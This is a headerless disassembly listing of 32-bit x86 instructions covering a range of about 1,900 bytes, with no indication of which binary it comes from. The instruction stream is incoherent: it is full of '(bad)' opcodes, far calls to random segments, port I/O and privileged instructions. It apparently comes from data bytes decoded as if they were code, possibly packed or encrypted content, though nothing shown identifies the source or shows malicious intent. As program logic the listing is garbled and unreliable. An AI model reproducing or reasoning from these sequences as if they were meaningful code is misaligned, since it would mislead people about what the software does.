  43797b:	data16 mov dl,0x14
  43797e:	ss hlt 
  437980:	in     eax,dx
  437981:	xchg   edi,eax
  437982:	mov    ecx,0x120b2a1c
  437987:	xor    al,0x4c
  437989:	lods   eax,DWORD PTR ds:[esi]
  43798a:	aam    0x7d
  43798c:	and    bl,BYTE PTR fs:[edx+0x595abbb9]
  437993:	stc    
  437994:	xchg   DWORD PTR [ebp-0xb],ebp
  437997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437998:	push   cs
  437999:	out    0x78,al
  43799b:	(bad)  
  43799c:	push   esi
  43799d:	mov    ch,BYTE PTR [esi]
  43799f:	xor    al,0xb2
  4379a1:	jns    0x437974
  4379a3:	sub    ah,al
  4379a5:	xchg   esi,eax
  4379a6:	push   0xfb7cbe21
  4379ab:	cdq    
  4379ac:	dec    esp
  4379ad:	push   ebp
  4379ae:	call   0x6977:0x9189ce10
  4379b5:	sbb    BYTE PTR [edx-0x54b5f68a],bl
  4379bb:	xlat   BYTE PTR ds:[ebx]
  4379bc:	and    edi,edi
  4379be:	out    0xa8,eax
  4379c0:	adc    eax,0x33ea635a
  4379c5:	and    al,BYTE PTR [ebx-0x1b248be6]
  4379cb:	jl     0x437979
  4379cd:	dec    ebp
  4379ce:	iret   
  4379cf:	sbb    eax,0x55580b88
  4379d4:	and    eax,0xe8d8c92f
  4379d9:	or     ebp,DWORD PTR [edx+0x44]
  4379dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4379dd:	mov    ecx,0x165e38a7
  4379e2:	call   0x88ae:0x91276ff8
  4379e9:	add    esp,ecx
  4379eb:	mov    al,ds:0xfbe6dfad
  4379f0:	mov    edi,DWORD PTR ds:[ebp-0x5d]
  4379f4:	shl    esi,0x9a
  4379f7:	push   ebp
  4379f8:	clc    
  4379f9:	sub    DWORD PTR [edi],eax
  4379fb:	imul   esi,DWORD PTR [ebp-0xc58e21f],0x60
  437a02:	fbstp  TBYTE PTR [edi+0x4b]
  437a05:	sub    edx,DWORD PTR [ebp+eiz*2-0x4e]
  437a09:	inc    eax
  437a0a:	xchg   ebx,eax
  437a0b:	mov    esi,esi
  437a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437a0e:	cmp    bh,BYTE PTR [ecx]
  437a10:	add    BYTE PTR [edx],cl
  437a12:	int    0xa4
  437a14:	add    eax,0x137a45c0
  437a19:	xlat   BYTE PTR ds:[ebx]
  437a1a:	mov    eax,0xe8b5b29e
  437a1f:	or     DWORD PTR [ecx],eax
  437a21:	cmp    ebx,ebp
  437a23:	push   cs
  437a24:	cli    
  437a25:	icebp  
  437a26:	adc    eax,0x8fb0bea8
  437a2b:	or     esi,DWORD PTR [edx]
  437a2d:	iret   
  437a2e:	aaa    
  437a2f:	dec    esi
  437a30:	in     eax,dx
  437a31:	and    eax,0xaf4d5999
  437a36:	ja     0x437a93
  437a38:	mov    cl,0xa
  437a3a:	mov    BYTE PTR [ebx+0x554c7987],bh
  437a40:	stos   BYTE PTR es:[edi],al
  437a41:	(bad)  [ecx-0x4ec74a2f]
  437a47:	cmp    eax,0xb3fa634d
  437a4c:	push   0xffffffc6
  437a4e:	out    dx,eax
  437a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437a50:	repnz aad 0x17
  437a53:	inc    edi
  437a54:	sar    BYTE PTR [edi-0x1d4ef4d7],0x5d
  437a5b:	cli    
  437a5c:	fwait
  437a5d:	pop    ebp
  437a5e:	cmp    eax,DWORD PTR [edi+0x64]
  437a61:	xchg   esi,eax
  437a62:	xchg   DWORD PTR [ecx-0x4],eax
  437a65:	out    0x7e,eax
  437a67:	test   al,0x1b
  437a69:	push   ds
  437a6a:	jl     0x437a9f
  437a6c:	adc    bl,BYTE PTR [ebx+0x55461cf6]
  437a72:	pop    edx
  437a73:	cmp    eax,0x46796540
  437a78:	scas   eax,DWORD PTR es:[edi]
  437a79:	or     esi,DWORD PTR [edi]
  437a7b:	jo     0x437af7
  437a7d:	fisubr WORD PTR [ebp-0x75]
  437a80:	dec    edx
  437a81:	and    DWORD PTR [eax-0x24740bd2],0x38
  437a88:	pop    ebx
  437a89:	or     ch,BYTE PTR [esi-0x5ff4a154]
  437a8f:	xchg   edi,eax
  437a90:	jne    0x437a9e
  437a92:	lock popa 
  437a94:	lea    ebx,[ebp-0x66]
  437a97:	jp     0x437a95
  437a99:	pop    edi
  437a9a:	mov    esp,0xa952edb3
  437aa0:	out    dx,al
  437aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437aa2:	(bad)  
  437aa3:	loopne 0x437a97
  437aa5:	scas   eax,DWORD PTR es:[edi]
  437aa6:	push   es
  437aa7:	mov    esi,0x699a2d5b
  437aac:	xor    eax,0xe388f248
  437ab1:	out    0xf8,eax
  437ab3:	aam    0x31
  437ab5:	or     ebx,edi
  437ab7:	gs in  al,0xa6
  437aba:	and    BYTE PTR [edx-0x22658c6e],cl
  437ac0:	jle    0x437a55
  437ac2:	lods   al,BYTE PTR ds:[esi]
  437ac3:	sub    eax,0xa7485e00
  437ac8:	clc    
  437ac9:	shl    BYTE PTR [ebx-0x4b53e791],cl
  437acf:	(bad)  
  437ad0:	mov    dl,0xe4
  437ad2:	test   BYTE PTR [eax+ecx*4+0x26],dh
  437ad6:	xchg   edi,eax
  437ad7:	arpl   di,si
  437ad9:	out    0xea,eax
  437adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437adc:	rcr    DWORD PTR [esi+esi*1+0x4a63782f],1
  437ae3:	push   esp
  437ae4:	sbb    DWORD PTR [edi],eax
  437ae6:	call   0x74b9:0xecf2ff4c
  437aed:	add    BYTE PTR [ebx+0x1af94d99],0xd6
  437af4:	and    eax,0x7fb543fd
  437af9:	sbb    al,0x99
  437afb:	lahf   
  437afc:	fwait
  437afd:	jno    0x437b5d
  437aff:	pop    ebp
  437b00:	cld    
  437b01:	mov    ebx,0x5807636
  437b06:	xchg   edi,eax
  437b07:	sbb    al,0x42
  437b09:	or     dl,bh
  437b0b:	xchg   edx,eax
  437b0c:	push   eax
  437b0d:	pop    edx
  437b0e:	xchg   esi,eax
  437b0f:	mov    dh,BYTE PTR [edx-0x29d5a336]
  437b15:	out    dx,al
  437b16:	mov    dh,0xc6
  437b18:	stc    
  437b19:	push   cs
  437b1a:	mov    ch,0xc4
  437b1c:	test   al,bl
  437b1e:	mov    ds:0xd30ceb67,eax
  437b23:	inc    ebp
  437b24:	mov    dl,0xda
  437b26:	pop    ecx
  437b27:	scas   eax,DWORD PTR es:[edi]
  437b28:	mov    al,ds:0xa8ab2ffd
  437b2d:	or     eax,ebp
  437b2f:	mov    esi,0x3e1cc07c
  437b34:	inc    ecx
  437b35:	add    al,0x9a
  437b37:	inc    eax
  437b38:	pop    ebp
  437b39:	inc    eax
  437b3a:	pop    edx
  437b3b:	sub    al,0x96
  437b3d:	sub    esi,esp
  437b3f:	mov    ebx,0x67c3a2d0
  437b44:	push   DWORD PTR [eax-0x6bab1ddc]
  437b4a:	call   0x41e1:0x755171cf
  437b51:	jmpw   0x9fc
  437b55:	or     ch,dl
  437b57:	das    
  437b58:	(bad)  
  437b59:	stc    
  437b5a:	mov    cl,0x6f
  437b5c:	mov    dl,0x8f
  437b5e:	(bad)  
  437b5f:	push   edi
  437b60:	fwait
  437b61:	mov    ah,0x0
  437b63:	mov    ecx,DWORD PTR [edi+0x33d1060b]
  437b69:	adc    DWORD PTR [edi-0x37],ecx
  437b6c:	push   ebp
  437b6d:	sub    DWORD PTR [edx-0x4c6492e],ebx
  437b73:	sub    eax,ebx
  437b75:	mov    ds:0x78f7a560,eax
  437b7a:	aas    
  437b7b:	daa    
  437b7c:	mov    ds:0x2b2f9e0,al
  437b81:	into   
  437b82:	sub    dh,BYTE PTR ds:[edx-0x7bbb4a94]
  437b89:	in     al,0x95
  437b8b:	or     edi,DWORD PTR [ebx+0xb]
  437b8e:	loop   0x437b7d
  437b90:	mov    ecx,DWORD PTR [eax+ebp*4]
  437b93:	xchg   esi,eax
  437b94:	mov    eax,ds:0x964c9cd4
  437b99:	mov    eax,ds:0xbe04478
  437b9e:	add    dh,BYTE PTR ds:0x301b5252
  437ba4:	rcl    eax,1
  437ba6:	call   0xfd5c:0x5cad6f92
  437bad:	adc    al,0xa
  437baf:	mov    al,0xce
  437bb1:	sub    ebx,DWORD PTR [edi+0x62a16fa6]
  437bb7:	mov    dh,0x6
  437bb9:	hlt    
  437bba:	add    bl,BYTE PTR [esi+0x45a27eaa]
  437bc0:	aaa    
  437bc1:	mov    eax,DWORD PTR [edx+edi*8]
  437bc4:	xor    al,0xca
  437bc6:	test   al,0x37
  437bc8:	mov    esi,0xb6f8700b
  437bcd:	ins    BYTE PTR es:[edi],dx
  437bce:	gs pop es
  437bd0:	rol    DWORD PTR [edx+0x74],0xef
  437bd4:	mov    esp,0x77153c70
  437bd9:	imul   eax,ebx,0xffffffc8
  437bdc:	mov    edi,0x76a70d6e
  437be1:	loop   0x437c06
  437be3:	inc    edx
  437be4:	jno    0x437c62
  437be6:	clc    
  437be7:	rol    BYTE PTR [eax-0x19],0x9a
  437beb:	retf   0xd11c
  437bee:	sbb    bh,dh
  437bf0:	ret    0xa4b4
  437bf3:	mov    ebx,0x663e1bce
  437bf8:	lods   eax,DWORD PTR ds:[esi]
  437bf9:	mov    edx,0xc72b6f0a
  437bfe:	iret   
  437bff:	shl    DWORD PTR [edx-0x2946434b],0x63
  437c06:	xchg   esp,eax
  437c07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437c08:	pop    edx
  437c09:	or     esp,DWORD PTR [ebx+0xe]
  437c0c:	pop    ds
  437c0d:	or     DWORD PTR [edx-0x45],0xfffffff0
  437c11:	repz mov al,ds:0x7b0bf17e
  437c17:	sahf   
  437c18:	xor    cl,dl
  437c1a:	fidiv  WORD PTR [edx-0x4a]
  437c1d:	or     esp,edi
  437c1f:	add    eax,0xf7e1e6c7
  437c24:	or     ch,BYTE PTR [ebp+edx*4+0x52]
  437c28:	mov    ss,WORD PTR ss:[esp+ecx*8-0x57]
  437c2d:	fcomp  QWORD PTR [edx+0x34]
  437c30:	sbb    al,0xaf
  437c32:	fwait
  437c33:	popf   
  437c34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437c35:	les    ecx,FWORD PTR [eax+ebx*4]
  437c38:	sbb    BYTE PTR [edi+0xb836c62],bh
  437c3e:	pop    esi
  437c3f:	mov    ch,0x8
  437c41:	mov    esi,0x400302ee
  437c46:	popf   
  437c47:	lock sti 
  437c49:	lahf   
  437c4a:	lds    edi,FWORD PTR [ebp-0x7a90611e]
  437c50:	add    al,0xb
  437c52:	dec    ebp
  437c53:	sti    
  437c54:	xbegin 0x4671b526
  437c5a:	call   0xa1a9:0xdff967b5
  437c61:	loopne 0x437c92
  437c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437c64:	or     DWORD PTR ds:0xa07d89fa,ebx
  437c6a:	test   cl,cl
  437c6c:	mov    al,0xd1
  437c6e:	mov    ds:0x7284f02d,al
  437c73:	inc    edi
  437c74:	mov    ah,0x10
  437c76:	jp     0x437c18
  437c78:	dec    edi
  437c79:	jno    0x437c20
  437c7b:	mov    eax,ds:0x88614b6d
  437c80:	mov    ds:0xb25e6264,al
  437c85:	mov    cl,0x1f
  437c87:	xchg   esi,eax
  437c89:	mov    ah,0x34
  437c8b:	stos   BYTE PTR es:[edi],al
  437c8c:	mov    ah,0xb
  437c8e:	jmp    0x4d8b:0x317ebd85
  437c95:	xor    ch,cl
  437c97:	clc    
  437c98:	mov    cl,0x9e
  437c9a:	dec    esi
  437c9b:	or     ecx,esp
  437c9d:	loope  0x437cf7
  437c9f:	das    
  437ca0:	xchg   ebp,eax
  437ca1:	push   ds
  437ca2:	lods   al,BYTE PTR ds:[esi]
  437ca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437ca4:	popf   
  437ca5:	fwait
  437ca6:	call   0x57e77772
  437cab:	arpl   WORD PTR [edx+0x6eae16af],si
  437cb1:	cdq    
  437cb2:	mov    ds:0xfb17eea6,al
  437cb7:	int    0x36
  437cb9:	or     edi,DWORD PTR [ebx+edi*4-0x75]
  437cbd:	dec    ebp
  437cbe:	lods   al,BYTE PTR ds:[esi]
  437cbf:	addr16 mov dl,0x96
  437cc2:	movq   mm1,mm2
  437cc5:	and    eax,DWORD PTR [ecx+0x6]
  437cc8:	or     al,0xb
  437cca:	mov    al,0xd9
  437ccc:	or     BYTE PTR [ebx+eiz*1-0x60],al
  437cd0:	cdq    
  437cd1:	fcomp  DWORD PTR [edx+0x52f8ba66]
  437cd7:	ss inc esp
  437cd9:	jno    0x437c86
  437cdb:	xlat   BYTE PTR ds:[ebx]
  437cdc:	or     esi,DWORD PTR ds:[ecx]
  437cdf:	sub    DWORD PTR [edi+0x612e38a1],edi
  437ce5:	stos   BYTE PTR es:[edi],al
  437ce6:	test   ecx,esi
  437ce8:	push   0x9192da99
  437ced:	sub    cl,BYTE PTR [esi]
  437cef:	mov    DWORD PTR [ebp-0xac9f6f8],0x72fbe364
  437cf9:	hlt    
  437cfa:	jmp    FWORD PTR [ebp-0x4e]
  437cfd:	fiadd  DWORD PTR [ebx-0x21]
  437d00:	inc    edi
  437d01:	mov    ebx,0x30c85c8b
  437d06:	int    0xb
  437d08:	mov    dl,0x3d
  437d0a:	mov    al,0x35
  437d0c:	and    ch,dl
  437d0e:	push   edi
  437d0f:	mov    ebp,0xfea7f7b1
  437d14:	pop    esp
  437d15:	push   eax
  437d16:	pop    esp
  437d17:	pop    esp
  437d18:	fadd   st,st(3)
  437d1a:	xor    dh,BYTE PTR [ecx-0x1f]
  437d1d:	or     eax,DWORD PTR [ebx+0x72]
  437d20:	inc    ebx
  437d21:	call   0x239a:0x86f09d4e
  437d28:	sub    dh,cl
  437d2a:	xchg   DWORD PTR [edx-0x2b4c0cf0],esi
  437d30:	jae    0x437d49
  437d32:	test   al,0x65
  437d34:	push   ebp
  437d35:	retf   
  437d36:	scas   eax,DWORD PTR es:[edi]
  437d37:	popa   
  437d38:	int    0xe7
  437d3a:	dec    ebp
  437d3b:	xor    esi,DWORD PTR [ebp+0x495245f4]
  437d41:	iret   
  437d42:	sar    DWORD PTR [edi-0x1e],0x7f
  437d46:	mov    dh,0xa7
  437d48:	mov    dh,0x2e
  437d4a:	outs   dx,BYTE PTR ds:[esi]
  437d4b:	xor    BYTE PTR [eax-0x4dbf1968],dl
  437d51:	outs   dx,BYTE PTR ds:[esi]
  437d52:	dec    ebx
  437d53:	sar    DWORD PTR [esi],0x97
  437d56:	aam    0xe3
  437d58:	in     eax,0x7b
  437d5a:	in     al,0xa7
  437d5c:	enter  0x28bd,0xa2
  437d60:	call   0x4a40:0xb2140012
  437d67:	iret   
  437d68:	xor    edx,DWORD PTR [ecx-0x70]
  437d6b:	(bad)  
  437d6c:	sahf   
  437d6d:	je     0x437d0c
  437d6f:	mov    ebx,0x6766050a
  437d74:	sti    
  437d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437d76:	inc    ebx
  437d77:	add    edi,edi
  437d79:	jp     0x437de9
  437d7b:	sahf   
  437d7c:	mov    dl,0xb0
  437d7e:	jp     0x437d75
  437d80:	mov    eax,0x58cd8ad
  437d85:	or     esp,DWORD PTR [eax]
  437d87:	mov    ebp,0x4ef31d95
  437d8c:	pop    eax
  437d8d:	rol    BYTE PTR [ebp+0x5a9b4d24],0x5c
  437d94:	bound  edi,QWORD PTR [ebx]
  437d96:	lds    eax,FWORD PTR [edx-0x423ecbe2]
  437d9c:	mov    bh,0x5e
  437d9e:	std    
  437d9f:	jle    0x437d52
  437da1:	mov    esp,DWORD PTR [edi]
  437da3:	daa    
  437da4:	fnstsw WORD PTR ds:0xa5f9d395
  437daa:	adc    eax,0x427cbb87
  437daf:	nop
  437db0:	popa   
  437db1:	or     al,BYTE PTR [edi]
  437db3:	popa   
  437db4:	mov    ds:0xe18b026,eax
  437db9:	in     al,dx
  437dba:	inc    edx
  437dbb:	pop    esi
  437dbc:	dec    ebp
  437dbd:	je     0x437d59
  437dbf:	sahf   
  437dc0:	jl     0x437db0
  437dc2:	clc    
  437dc3:	mov    eax,0xa7fe311d
  437dc8:	xor    BYTE PTR [esi-0x80],bl
  437dcb:	lods   eax,DWORD PTR ds:[esi]
  437dcc:	adc    BYTE PTR [ecx-0x6b],al
  437dcf:	xchg   edi,eax
  437dd0:	mov    ch,0x74
  437dd2:	stc    
  437dd3:	xchg   ebx,eax
  437dd4:	pop    ebp
  437dd5:	fmul   st(2),st
  437dd7:	cmp    eax,0xa9d7a4f4
  437ddc:	idiv   DWORD PTR [ebp-0x18]
  437ddf:	pop    es
  437de0:	shl    al,cl
  437de2:	xor    BYTE PTR [ebx],al
  437de4:	inc    ebx
  437de5:	push   edi
  437de6:	fwait
  437de7:	xor    DWORD PTR ds:0x13a3566f,esi
  437ded:	adc    BYTE PTR [edx-0x53],dl
  437df0:	inc    ecx
  437df1:	pop    ss
  437df2:	stos   BYTE PTR es:[edi],al
  437df3:	not    BYTE PTR [edi-0x11a27cb5]
  437df9:	sbb    DWORD PTR [ecx],ebx
  437dfb:	push   cs
  437dfc:	mov    dl,0x11
  437dfe:	es push edi
  437e00:	cdq    
  437e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437e02:	and    ch,bh
  437e04:	adc    al,0xb
  437e06:	(bad)  
  437e07:	xchg   ebp,eax
  437e08:	outs   dx,BYTE PTR ds:[esi]
  437e09:	aas    
  437e0a:	xchg   edi,eax
  437e0b:	jg     0x437e82
  437e0d:	leave  
  437e0e:	call   0xae68:0xfe8477d2
  437e15:	shr    DWORD PTR [eax+eiz*4-0x8],0x93
  437e1a:	or     ecx,edx
  437e1c:	or     BYTE PTR [ebx+0x2d],ch
  437e1f:	xchg   ebp,eax
  437e20:	mov    esp,0xaddce5ee
  437e25:	(bad)  
  437e26:	mov    ecx,0x90b432a0
  437e2b:	and    al,0xe8
  437e2d:	ss mov bh,0xa7
  437e30:	adc    ecx,DWORD PTR [esi-0x65b3d608]
  437e36:	addr16 out dx,eax
  437e38:	mov    dl,0x76
  437e3a:	cmc    
  437e3b:	inc    edx
  437e3c:	pusha  
  437e3d:	add    dl,cl
  437e3f:	aad    0x9e
  437e41:	add    eax,0xf85fd084
  437e46:	call   0x89bb:0xcb23179
  437e4d:	mov    cl,0x65
  437e4f:	daa    
  437e50:	inc    eax
  437e51:	jle    0x437eb5
  437e53:	bound  ebp,QWORD PTR [ecx+0x59a76328]
  437e59:	push   ss
  437e5a:	cdq    
  437e5b:	or     BYTE PTR [esi],dh
  437e5d:	push   ebx
  437e5e:	nop
  437e5f:	div    BYTE PTR [edx-0x27922d15]
  437e65:	lods   al,BYTE PTR ds:[esi]
  437e66:	dec    ebx
  437e67:	push   ds
  437e68:	push   es
  437e69:	or     ebx,DWORD PTR [ebx+0x7e]
  437e6c:	nop
  437e6d:	and    eax,0xd140edcf
  437e72:	call   0xe4f3:0x567a364e
  437e79:	inc    edi
  437e7a:	sbb    esp,DWORD PTR [edi-0x72434375]
  437e80:	xor    BYTE PTR [esi-0x17],al
  437e83:	clc    
  437e84:	mov    dl,0xe3
  437e86:	fwait
  437e87:	push   esp
  437e88:	stos   BYTE PTR es:[edi],al
  437e89:	fld    DWORD PTR [edi+esi*8-0x11f0f4e8]
  437e90:	push   ss
  437e91:	xlat   BYTE PTR ds:[ebx]
  437e92:	adc    DWORD PTR [edi-0x1f],edx
  437e95:	mov    cl,0x9d
  437e97:	mov    esi,0xc2ac2378
  437e9c:	xor    edi,eax
  437e9e:	das    
  437e9f:	sti    
  437ea0:	repnz mov ebp,0x82652a6
  437ea6:	fild   WORD PTR [ecx+eax*8+0x24]
  437eaa:	xchg   edi,eax
  437eab:	mov    DWORD PTR [edx],0xb2dd5483
  437eb1:	push   edx
  437eb2:	cdq    
  437eb3:	fsub   QWORD PTR [esi+0x14]
  437eb6:	lahf   
  437eb7:	sbb    BYTE PTR [ebp+0x636a730b],al
  437ebd:	adc    BYTE PTR [ebx-0x656a9a39],al
  437ec3:	fs jge 0x437f2a
  437ec6:	in     eax,dx
  437ec7:	ss and ch,dh
  437eca:	and    BYTE PTR [edi-0x2ad02633],0x54
  437ed1:	aam    0x63
  437ed3:	mov    al,0x8f
  437ed5:	push   ss
  437ed6:	inc    ebx
  437ed7:	and    eax,0x304e5a0b
  437edc:	test   eax,0x17c610eb
  437ee1:	adc    eax,0x8b6e35f1
  437ee6:	sbb    edx,ecx
  437ee8:	int    0xee
  437eea:	int3   
  437eeb:	push   eax
  437eec:	mov    cl,0xc
  437eee:	addr16 sti 
  437ef0:	aaa    
  437ef1:	and    DWORD PTR [esi],0x7bcb942f
  437ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437ef8:	jns    0x437f60
  437efa:	jae    0x437f16
  437efc:	adc    DWORD PTR [bx-0x4d20],esi
  437f01:	push   ebx
  437f02:	pop    ss
  437f03:	add    ebp,DWORD PTR [esi-0x21fa3272]
  437f09:	or     edx,DWORD PTR [esp+ecx*2]
  437f0c:	rep outs dx,DWORD PTR ds:[esi]
  437f0e:	xor    DWORD PTR [esi-0x59],0xfb4b9aec
  437f15:	pop    ecx
  437f16:	lods   eax,DWORD PTR ds:[esi]
  437f17:	mov    gs,WORD PTR [ebp-0x40586ccc]
  437f1d:	push   ebp
  437f1e:	mov    al,0xa5
  437f20:	mov    ebp,DWORD PTR [ecx-0x6e]
  437f23:	mov    bl,0x4a
  437f25:	dec    edi
  437f26:	call   0x4b13:0x45e94c18
  437f2d:	stos   DWORD PTR es:[edi],eax
  437f2e:	jmp    0x437ed7
  437f30:	inc    ebx
  437f31:	lock (bad) 
  437f33:	push   esp
  437f34:	xchg   esi,eax
  437f35:	into   
  437f36:	aam    0x25
  437f38:	mov    dl,0x7d
  437f3a:	xor    eax,0x12c3da73
  437f3f:	pop    edx
  437f40:	sub    BYTE PTR [ebx],cl
  437f42:	jnp    0x437f47
  437f44:	jne    0x437fa6
  437f46:	cld    
  437f47:	loop   0x437f69
  437f49:	fs jmp 0xf1a0:0xb3a68e72
  437f51:	pop    ds
  437f52:	xchg   ebx,eax
  437f53:	test   DWORD PTR [edx-0x1b],esp
  437f56:	pushf  
  437f57:	call   0x8bfc:0x775515e2
  437f5e:	dec    ebp
  437f5f:	rcl    BYTE PTR [edx+0x19],cl
  437f62:	pop    es
  437f63:	fbstp  TBYTE PTR [edx-0x2b70184d]
  437f69:	xchg   DWORD PTR ds:[ebx-0x65],ebp
  437f6d:	or     ecx,DWORD PTR [ecx-0x595c7c8f]
  437f73:	and    DWORD PTR ds:0x2db09af0,eax
  437f79:	cmp    eax,0xc97232c
  437f7e:	(bad)  
  437f7f:	pop    edi
  437f80:	mov    edi,0x81f7720b
  437f85:	mov    bh,0x94
  437f87:	mov    bl,0x26
  437f89:	inc    ebp
  437f8a:	in     eax,0x79
  437f8c:	mov    ch,0xef
  437f8e:	cs push edi
  437f90:	and    BYTE PTR [edi-0xd62c2b6],0x38
  437f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437f98:	aam    0x20
  437f9a:	(bad)  
  437f9b:	(bad)  
  437f9c:	out    0xe9,eax
  437f9e:	ret    0xad40
  437fa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437fa2:	rcl    esi,cl
  437fa4:	icebp  
  437fa5:	cmp    DWORD PTR [esi+edi*2+0x63],eax
  437fa9:	mov    ebx,0x1776dc6d
  437fae:	or     al,0x68
  437fb0:	or     bx,WORD PTR [ebx+0x1b6872e2]
  437fb7:	sbb    BYTE PTR [edx-0x119d5624],dh
  437fbd:	inc    esp
  437fbe:	mov    edx,0xb00b8cbe
  437fc3:	or     al,0xc8
  437fc5:	inc    edi
  437fc6:	fisub  DWORD PTR [ebx+0x61]
  437fc9:	mov    ds:0x491ec89a,eax
  437fce:	push   cs
  437fcf:	and    eax,0xa5cc1eb1
  437fd4:	loop   0x438004
  437fd6:	mov    gs,WORD PTR [edi+0x24da63ac]
  437fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437fdd:	js     0x437f79
  437fdf:	or     ecx,DWORD PTR [eax]
  437fe1:	pop    esp
  437fe2:	daa    
  437fe3:	xchg   al,bl
  437fe5:	mov    ch,0x4e
  437fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437fe8:	repnz in eax,dx
  437fea:	pop    ebp
  437feb:	cs ds jb 0x438033
  437fef:	sahf   
  437ff0:	mov    dl,0x9b
  437ff2:	xchg   BYTE PTR [eax+ecx*8-0x74],ah
  437ff6:	loope  0x43802e
  437ff8:	mov    ds:0x9abff70b,al
  437ffd:	cmp    bl,bl
  437fff:	shr    DWORD PTR [esi*4+0x528da99],0xc3
  438007:	mov    ch,BYTE PTR [ecx-0x4d]
  43800a:	ins    DWORD PTR es:[edi],dx
  43800b:	xchg   esp,eax
  43800c:	push   es
  43800d:	or     BYTE PTR [ecx-0x38],dl
  438010:	loopne 0x437f95
  438012:	or     eax,DWORD PTR [edx+0x1a]
  438015:	lahf   
  438016:	mov    cl,0x80
  438018:	mov    dl,0x91
  43801a:	das    
  43801b:	int3   
  43801c:	push   ecx
  43801d:	sbb    DWORD PTR [eax+ecx*2+0x42],0x9e3c4f0b
  438025:	dec    esp
  438026:	bound  edi,QWORD PTR [ebx-0x2a]
  438029:	dec    ebx
  43802a:	call   0xf7f3:0xa269da6f
  438031:	int    0x83
  438033:	test   al,0x72
  438035:	push   cs
  438036:	xchg   edi,eax
  438037:	dec    esp
  438038:	jb     0x43800b
  43803a:	xor    eax,0x9acf95c7
  43803f:	dec    ebx
  438040:	pop    ebx
  438041:	mov    esp,0xc858ae2
  438046:	retf   
  438047:	fisttp DWORD PTR [edx]
  438049:	or     edx,edi
  43804b:	add    bh,BYTE PTR ds:0xb7c6dc28
  438051:	mov    esi,0x35be0989
  438056:	call   0x5f10:0xbfc74dbd
  43805d:	or     ebp,esp
  43805f:	cs pop esi
  438061:	lds    esi,FWORD PTR [ebx]
  438063:	pop    es
  438064:	scas   al,BYTE PTR es:[edi]
  438065:	int3   
  438066:	call   0x2871:0xdd0e0c3
  43806d:	(bad)  
  43806e:	mov    cl,0x83
  438070:	or     edx,ebp
  438072:	stc    
  438073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438074:	in     eax,0xe0
  438076:	cmp    al,0xf7
  438078:	mov    BYTE PTR [ebp+0xb018dd6],bl
  43807e:	pop    es
  43807f:	in     al,dx
  438080:	not    BYTE PTR [esi]
  438082:	ins    DWORD PTR es:[edi],dx
  438083:	ja     0x4380d6
  438085:	je     0x438103
  438087:	mov    al,0xa8
  438089:	dec    eax
  43808a:	fisub  DWORD PTR [edi-0x54f61f4e]
  438090:	cmp    eax,0xfff79ab1
  438095:	sub    al,0xa7
  438097:	mov    bl,0xca
  438099:	aas    
  43809a:	pop    ebp
  43809b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43809c:	aaa    
  43809d:	call   0xc1474283
  4380a2:	inc    eax
  4380a3:	and    al,0xb5
  4380a5:	xor    ecx,DWORD PTR [edx+eax*4]
  4380a8:	jnp    0x4380d1
  4380aa:	retf   0x2d8f
  4380ad:	xchg   esi,eax
  4380ae:	sbb    esp,DWORD PTR [edi+0x35bab115]
  4380b4:	pop    ebp
  4380b5:	(bad)  
  4380b6:	pop    ss
  4380b7:	shl    DWORD PTR [edx-0x4ae84164],1
  4380bd:	jns    0x43806e
  4380bf:	mov    esp,0xaa050b85
  4380c4:	cli    
  4380c5:	sahf   
  4380c6:	mov    ds:0xa12679d4,eax
  4380cb:	inc    esp
  4380cc:	jnp    0x438059
  4380ce:	inc    edi
  4380cf:	dec    edi
  4380d0:	jno    0x4380ca
  4380d2:	in     eax,dx
  4380d3:	mov    dl,0x6d
  4380d5:	or     al,0x5f
  4380d7:	call   0x5737aa29
  4380dc:	loop   0x43807a
  4380de:	inc    ebx
  4380df:	xchg   DWORD PTR [esi-0x3463646b],eax
  4380e5:	rcl    BYTE PTR [edi-0x5d],0x8d
  4380e9:	mov    edi,0xb2b47ea
  4380ee:	es (bad) 
  4380f0:	(bad)  
  4380f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4380f2:	xchg   DWORD PTR [eax],ecx
  4380f4:	enter  0x8744,0xcb
  4380f8:	lahf   
  4380f9:	test   eax,0xddb9e074
  4380fe:	pop    ecx
  4380ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438100:	sbb    eax,0x1a486a31
  438105:	or     esi,DWORD PTR [esi-0x74d6e08a]
  43810b:	push   ss
  43810c:	pop    ebx
  43810d:	stos   DWORD PTR es:[edi],eax
  43810e:	mov    ds:0x90177270,eax
  438113:	push   edx
  438114:	fsub   QWORD PTR [edi-0x5cdfce66]
  43811a:	out    0x75,eax
  43811c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43811d:	or     edi,edi
  43811f:	inc    ebx
  438120:	jecxz  0x438116
  438122:	mov    esi,0x9bc4cd56
  438127:	jb     0x4380f9
  438129:	xchg   esp,eax
  43812a:	dec    esp
  43812b:	neg    DWORD PTR [ecx]
  43812d:	aas    
  43812e:	inc    edx
  43812f:	xor    ecx,DWORD PTR [edi]
  438131:	out    dx,eax
  438132:	imul   esp,DWORD PTR [edi-0x50a9f68d],0x4c3d0aa8
  43813c:	mov    dl,0xc9
  43813e:	call   FWORD PTR [edi+0x7a724c0b]
  438144:	les    ecx,FWORD PTR [ebx]
  438146:	aam    0x44
